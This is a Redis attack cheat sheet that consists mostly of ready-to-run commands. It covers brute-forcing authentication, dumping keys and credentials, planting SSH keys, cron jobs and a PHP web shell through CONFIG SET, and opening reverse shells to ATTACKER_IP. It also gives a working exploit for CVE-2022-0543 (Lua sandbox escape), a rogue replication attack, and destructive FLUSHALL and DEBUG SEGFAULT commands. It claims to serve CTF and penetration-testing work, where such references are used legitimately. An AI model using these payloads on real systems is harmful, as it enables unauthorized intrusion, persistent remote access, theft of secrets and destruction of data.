# Redis Enumeration & Exploitation Cheat Sheet

---

## 1. Detection & Enumeration

```bash
# Nmap default scan
nmap -sV -p 6379 target.com

# Nmap with scripts
nmap -sV -p 6379 --script redis-info target.com
nmap -sV -p 6379 --script redis-brute target.com

# Banner grab
nc -vn target.com 6379

# Telnet
telnet target.com 6379
```

---

## 2. Basic Interaction

```bash
# Connect without auth
redis-cli -h target.com -p 6379

# Connect with auth
redis-cli -h target.com -p 6379 -a password

# One-liner commands
redis-cli -h target.com PING
redis-cli -h target.com INFO
redis-cli -h target.com CONFIG GET *
```

---

## 3. Unauthenticated Enumeration

```bash
# Server info
INFO
INFO server
INFO keyspace
INFO replication

# List all keys
KEYS *

# Get specific key
GET <key>

# Database size
DBSIZE

# Config
CONFIG GET dir
CONFIG GET dbfilename
CONFIG GET requirepass
CONFIG GET bind

# Client list
CLIENT LIST

# Slowlog
SLOWLOG GET
```

---

## 4. Authentication Bypass

```bash
# Check if auth required
redis-cli -h target.com PING
# +PONG = no auth required
# -NOAUTH = auth required

# Brute force with hydra
hydra -P /usr/share/wordlists/rockyou.txt redis://target.com

# Brute force with nmap
nmap -p 6379 --script redis-brute target.com

# Metasploit
use auxiliary/scanner/redis/redis_login
set RHOSTS target.com
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# Manual auth
redis-cli -h target.com AUTH password123
```

---

## 5. Data Extraction

```bash
# Get all keys
KEYS *

# Scan (safer on production)
SCAN 0 COUNT 100

# Get value by key
GET secret_key
GET session:abc123
GET user:1

# Get all hash fields
HGETALL users
HGETALL config

# List items
LRANGE mylist 0 -1

# Set members
SMEMBERS myset

# Sorted set
ZRANGE leaderboard 0 -1 WITHSCORES

# Dump all keys and values
redis-cli -h target.com --scan | xargs redis-cli -h target.com GET
```

---

## 6. Write Access Exploitation

### 6.1 Write SSH Authorized Keys

```bash
# Generate SSH key pair
ssh-keygen -t rsa -f /tmp/redis_rsa -N ""

# Prepare payload
(echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/redis_pub.txt

# Write to Redis
cat /tmp/redis_pub.txt | redis-cli -h target.com -x SET payload

# Set directory and filename
redis-cli -h target.com CONFIG SET dir /root/.ssh
redis-cli -h target.com CONFIG SET dbfilename authorized_keys

# Save to disk
redis-cli -h target.com SAVE

# Connect via SSH
ssh -i /tmp/redis_rsa root@target.com
```

### 6.2 Write Cron Job

```bash
redis-cli -h target.com CONFIG SET dir /var/spool/cron/crontabs
redis-cli -h target.com CONFIG SET dbfilename root

redis-cli -h target.com SET payload "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"

redis-cli -h target.com SAVE
```

### 6.3 Write Web Shell

```bash
redis-cli -h target.com CONFIG SET dir /var/www/html
redis-cli -h target.com CONFIG SET dbfilename shell.php

redis-cli -h target.com SET payload "<?php system(\$_GET['cmd']); ?>"

redis-cli -h target.com SAVE

# Trigger
curl "http://target.com/shell.php?cmd=id"
```

---

## 7. Redis Module Exploitation (LPE/RCE)

```bash
# Load malicious module (if write access + module loading enabled)
# Compile RedisModules-ExecuteCommand or use n0b0dyCN/RedisModules-ExecuteCommand

redis-cli -h target.com MODULE LOAD /path/to/module.so
redis-cli -h target.com system.exec "id"
redis-cli -h target.com system.exec "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

---

## 8. Lua Sandbox Escape (CVE-2022-0543)

```bash
# Affects Debian/Ubuntu Redis packages
# Unauthenticated if no password set

redis-cli -h target.com EVAL "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('id', 'r'); local res = f:read('*a'); f:close(); return res" 0

# Reverse shell
redis-cli -h target.com EVAL "local io_l = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io'); local io = io_l(); local f = io.popen('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"', 'r'); local res = f:read('*a'); f:close(); return res" 0
```

---

## 9. Master-Slave Replication Attack

```bash
# If target is a slave, point it to attacker's rogue Redis
redis-cli -h target.com SLAVEOF ATTACKER_IP 6379

# Run rogue Redis server on attacker machine
# Then push malicious module via replication
```

---

## 10. Metasploit Modules

```bash
# File upload via Redis
use exploit/linux/redis/redis_replication_cmd_exec
set RHOSTS target.com
set LHOST ATTACKER_IP
run

# Scanner
use auxiliary/scanner/redis/redis_login
use auxiliary/scanner/redis/redis_server
```

---

## 11. Interesting Keys to Look For

```
password
passwd
secret
token
api_key
session
auth
admin
config
user
credential
jwt
private_key
```

---

## 12. Post-Exploitation

```bash
# Dump entire database
redis-cli -h target.com --rdb /tmp/dump.rdb
redis-cli -h target.com BGSAVE

# Flush database (destructive!)
FLUSHDB
FLUSHALL

# Monitor live commands
MONITOR

# Debug
DEBUG SLEEP 10
DEBUG SEGFAULT
```

---

## 13. CVE Reference

| CVE | Version | Description |
|-----|---------|-------------|
| CVE-2022-0543 | Debian/Ubuntu packages | Lua sandbox escape → RCE |
| CVE-2023-41056 | < 7.0.13 / < 7.2.1 | Heap overflow |
| CVE-2022-35977 | < 6.2.9 / < 7.0.5 | Integer overflow |
| CVE-2021-32761 | 2.2 - 6.2.5 | Integer overflow via GETDEL |
| CVE-2021-21309 | < 6.0.11 | Integer overflow |

---

## 14. Attack Flow

```
Detect Redis on port 6379
          ↓
No auth? → Direct access
Auth?    → Brute force
          ↓
Read access → Extract keys/credentials
          ↓
Write access → SSH key / Cron / Web shell
          ↓
Module load → RCE
          ↓
Root shell
```

---

*For CTF, penetration testing and bug bounty purposes only.*
